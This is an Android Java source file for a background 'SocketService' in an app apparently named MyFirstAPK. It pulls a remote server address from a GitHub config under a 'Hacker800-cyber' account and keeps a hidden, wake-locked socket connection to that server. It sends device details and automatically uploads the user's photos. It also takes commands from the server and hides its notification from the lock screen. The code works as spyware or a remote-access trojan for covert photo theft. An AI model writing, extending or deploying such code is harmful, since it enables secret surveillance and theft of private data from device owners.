package com.example.myfirstapk;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.example.myfirstapk.commands.PhotosCommand;
import com.example.myfirstapk.receivers.NetworkChangeReceiver;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Enhanced SocketService with:
 * - Config fetching from GitHub URL
 * - Cached config with SharedPreferences
 * - Wake lock for keeping service alive
 * - Foreground service with notifications
 * - Network callback for auto-reconnect
 * - Heartbeat mechanism
 * - Exponential backoff for reconnection
 * - PhotosCommand integration for automatic photo uploads
 */
public class SocketService extends Service {

    private static final String TAG = "SocketService";

    // ================= CONFIG =================
    private static final String CONFIG_URL = "https://raw.githubusercontent.com/Hacker800-cyber/ngrok-config/main/Connect";
    private static final String PREFS_NAME = "SocketConfig";
    private static final String KEY_HOST = "host";
    private static final String KEY_PORT = "port";

    private static final int CONFIG_FETCH_TIMEOUT = 10000; // 10 sec
    private static final int HEARTBEAT_INTERVAL = 30000;   // 30 sec
    private static final int MAX_RECONNECT_DELAY = 60000;  // 1 min
    private static final int BASE_RECONNECT_DELAY = 2000;  // 2 sec initial

    // ================= VARIABLES =================
    private PrintWriter out;
    private BufferedReader in;
    private PhotosCommand photosCommand;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private AtomicBoolean isConnected = new AtomicBoolean(false);
    private AtomicBoolean isConnecting = new AtomicBoolean(false);
    private AtomicBoolean isRunning = new AtomicBoolean(true);
    private Socket socket;
    private PowerManager.WakeLock wakeLock;
    private NetworkChangeReceiver networkReceiver;
    private int reconnectAttempts = 0;
    private String cachedHost = null;
    private int cachedPort = -1;
    private Thread connectionThread;
    private final Object connectionLock = new Object();
    private Runnable heartbeatRunnable;
    private Handler heartbeatHandler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🚀 Service onCreate");

        initWakeLock();
        startForeground();
        loadCachedConfig();          // Load last known good config
        registerNetworkCallback();    // Modern network listener (Android 5+)
        startHeartbeat();
        connectToServer();            // Start connection process
    }

    // ================= WAKELOCK =================
    /**
     * Initialize and acquire wake lock to keep CPU running
     * This prevents the device from sleeping while service is active
     */
    private void initWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "MyFirstAPK::Wakelock"
            );
            wakeLock.acquire(); // Acquire indefinitely – release only on service destroy
            Log.d(TAG, "⚡ WakeLock acquired (indefinite)");
        } catch (Exception e) {
            Log.e(TAG, "❌ WakeLock error", e);
        }
    }

    // ================= FOREGROUND =================
    /**
     * Start service in foreground with persistent notification
     * Required for Android O+ to keep service running
     */
    private void startForeground() {
        String channelId = "myfirstapk_channel";
        String channelName = "My Service";

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                channelId,
                channelName,
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("MyFirstAPK")
                .setContentText("Service is running...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();

        startForeground(1, notification);
        Log.d(TAG, "🔔 Foreground service started");
    }

    // ================= CACHED CONFIG =================
    /**
     * Load cached server configuration from SharedPreferences
     * Used as fallback when config URL is unreachable
     */
    private void loadCachedConfig() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        cachedHost = prefs.getString(KEY_HOST, null);
        cachedPort = prefs.getInt(KEY_PORT, -1);
        if (cachedHost != null && cachedPort != -1) {
            Log.d(TAG, "📦 Loaded cached config: " + cachedHost + ":" + cachedPort);
        } else {
            Log.d(TAG, "📦 No cached config found");
        }
    }

    /**
     * Save server configuration to SharedPreferences for future use
     */
    private void saveCachedConfig(String host, int port) {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                .edit()
                .putString(KEY_HOST, host)
                .putInt(KEY_PORT, port)
                .apply();
        Log.d(TAG, "💾 Cached config saved: " + host + ":" + port);
    }

    // ================= NETWORK CALLBACK =================
    /**
     * Register network callback to detect connectivity changes
     * Automatically triggers reconnection when network becomes available
     */
    private void registerNetworkCallback() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkRequest request = new NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build();

        cm.registerNetworkCallback(request, new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(@NonNull Network network) {
                Log.d(TAG, "📡 Network available");
                if (!isConnected.get() && !isConnecting.get()) {
                    mainHandler.post(() -> connectToServer());
                }
            }
        });
    }

    // ================= HEARTBEAT =================
    /**
     * Start periodic heartbeat to keep connection alive
     * Sends heartbeat every 30 seconds and triggers reconnect on failure
     */
    private void startHeartbeat() {
        heartbeatRunnable = () -> {
            if (isConnected.get() && out != null) {
                try {
                    out.println("[HEARTBEAT]");
                    out.flush();
                    Log.d(TAG, "💓 Heartbeat sent");
                } catch (Exception e) {
                    Log.e(TAG, "❌ Heartbeat failed – reconnecting...");
                    isConnected.set(false);
                    connectToServer();
                }
            }
            heartbeatHandler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL);
        };
        heartbeatHandler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL);
    }

    // ================= CONNECT TO SERVER =================
    /**
     * Main connection logic with exponential backoff retry
     * Fetches config from URL, falls back to cached config if needed
     */
    private void connectToServer() {
        synchronized (connectionLock) {
            if (isConnecting.get()) {
                Log.d(TAG, "⏳ Already connecting, skip request");
                return;
            }
            isConnecting.set(true);
        }

        new Thread(() -> {
            while (isRunning.get() && !isConnected.get()) {
                // 1️⃣ Fetch config
                String host = null;
                int port = -1;
                try {
                    String[] config = fetchConfigFromUrl();
                    host = config[0];
                    port = Integer.parseInt(config[1]);
                    saveCachedConfig(host, port);
                } catch (Exception e) {
                    Log.e(TAG, "⚠️ Config fetch failed, using cached", e);
                    if (cachedHost != null && cachedPort != -1) {
                        host = cachedHost;
                        port = cachedPort;
                    } else {
                        Log.e(TAG, "❌ No cached config available – cannot connect");
                        break; // Stop trying if no config
                    }
                }

                // 2️⃣ Connect socket
                try {
                    Log.d(TAG, "🔌 Connecting to " + host + ":" + port + " (attempt " + (reconnectAttempts + 1) + ")");
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(host, port), 15000); // 15s timeout
                    socket.setSoTimeout(0); // infinite read
                    socket.setKeepAlive(true);
                    socket.setTcpNoDelay(true);

                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                    isConnected.set(true);
                    reconnectAttempts = 0;
                    Log.d(TAG, "✅ Connected to server");

                    sendDeviceInfo();

                    if (photosCommand == null) {
                        photosCommand = new PhotosCommand(SocketService.this, out, mainHandler);
                    } else {
                        photosCommand.setOut(out);
                    }
                    photosCommand.startAutoUpload();
                    Log.d(TAG, "📸 PhotosCommand started");

                    listenForCommands();

                } catch (Exception e) {
                    Log.e(TAG, "❌ Connection failed: " + e.getMessage());
                    isConnected.set(false);
                    cleanupSocket();

                    int delay = Math.min(BASE_RECONNECT_DELAY * (1 << reconnectAttempts), MAX_RECONNECT_DELAY);
                    reconnectAttempts++;
                    Log.d(TAG, "⏱️ Reconnecting in " + delay + "ms (attempt " + reconnectAttempts + ")");

                    try {
                        Thread.sleep(delay);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            isConnecting.set(false);
        }).start();
    }

    // ================= FETCH CONFIG =================
    /**
     * Fetch server configuration from GitHub URL
     * Expected format: "host:port" (e.g., "192.168.1.100:8080")
     */
    private String[] fetchConfigFromUrl() throws IOException {
        java.net.URL url = new java.net.URL(CONFIG_URL);
        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(CONFIG_FETCH_TIMEOUT);
        conn.setReadTimeout(CONFIG_FETCH_TIMEOUT);
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
            String line = reader.readLine();
            if (line == null || line.isEmpty()) throw new IOException("Empty response");
            String[] parts = line.trim().split(":");
            if (parts.length != 2) throw new IOException("Invalid format: " + line);
            return parts;
        } finally {
            conn.disconnect();
        }
    }

    /**
     * Send device information to server on connection
     */
    private void sendDeviceInfo() {
        try {
            if (out != null) {
                String deviceInfo = "[DEVICE] " +
                    Build.MANUFACTURER + " " +
                    Build.MODEL + " Android " +
                    Build.VERSION.RELEASE + " API " +
                    Build.VERSION.SDK_INT;
                out.println(deviceInfo);
                out.flush();
                Log.d(TAG, "📱 Device info sent");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error sending device info", e);
        }
    }

    // ================= LISTEN & HANDLE =================
    /**
     * Listen for incoming commands from server
     * Blocking read operation - will wait for data
     */
    private void listenForCommands() {
        Log.d(TAG, "👂 Listening for commands");
        while (isRunning.get() && isConnected.get() && socket != null && !socket.isClosed()) {
            try {
                String line = in.readLine();
                if (line == null) {
                    Log.d(TAG, "🔌 Server closed connection");
                    break;
                }
                Log.d(TAG, "📨 Received: " + line);
                handleCommand(line);
            } catch (SocketTimeoutException e) {
                Log.d(TAG, "⏰ Socket timeout (ignored)");
            } catch (SocketException e) {
                Log.e(TAG, "🔌 Socket closed: " + e.getMessage());
                break;
            } catch (IOException e) {
                Log.e(TAG, "❌ Read error: " + e.getMessage());
                break;
            }
        }
        Log.d(TAG, "👂 Stopped listening");
        if (isRunning.get()) {
            isConnected.set(false);
            cleanupSocket();
            mainHandler.post(this::connectToServer);
        }
    }

    /**
     * Handle incoming commands from server
     * Supports: PING, HEARTBEAT, stop, restart, status
     * 
     * 🔹 FUTURE FEATURE IDEAS:
     * - Add dynamic commands via server JSON
     * - Add photo compression settings from server
     * - Add file upload/download commands
     * - Add logging level control via server
     * - Add command authentication for security
     */
    private void handleCommand(String command) {
        try {
            if (command.startsWith("[PING]") || command.startsWith("[HEARTBEAT]")) {
                out.println("[PONG]");
                out.flush();
            } else if ("stop".equals(command)) {
                if (photosCommand != null) photosCommand.stopUpload();
                out.println("[OK] Upload stopped");
            } else if ("restart".equals(command)) {
                if (photosCommand != null) photosCommand.startAutoUpload();
                out.println("[OK] Upload restarted");
            } else if ("status".equals(command)) {
                String status = isConnected.get() ? "Connected" : "Disconnected";
                out.println("[STATUS] " + status);
            }

            // 🔹 FUTURE FEATURE IDEA:
            // - Add dynamic commands via server JSON: e.g., update interval, fetch scripts
            // - Add photo compression settings from server
            // - Add file upload/download commands
            // - Add logging level control via server
            // - Add command authentication for security

        } catch (Exception e) {
            Log.e(TAG, "❌ Command error", e);
        }
    }

    // ================= CLEANUP =================
    /**
     * Clean up socket resources
     */
    private void cleanupSocket() {
        try {
            if (out != null) out.close();
            if (in != null) in.close();
            if (socket != null && !socket.isClosed()) socket.close();
        } catch (Exception e) {
            Log.e(TAG, "Cleanup error", e);
        }
        out = null;
        in = null;
        socket = null;
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "💀 Service onDestroy");
        isRunning.set(false);
        isConnected.set(false);

        if (photosCommand != null) photosCommand.stopUpload();
        heartbeatHandler.removeCallbacksAndMessages(null);
        cleanupSocket();

        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d(TAG, "⚡ WakeLock released");
        }

        mainHandler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "▶️ onStartCommand");
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
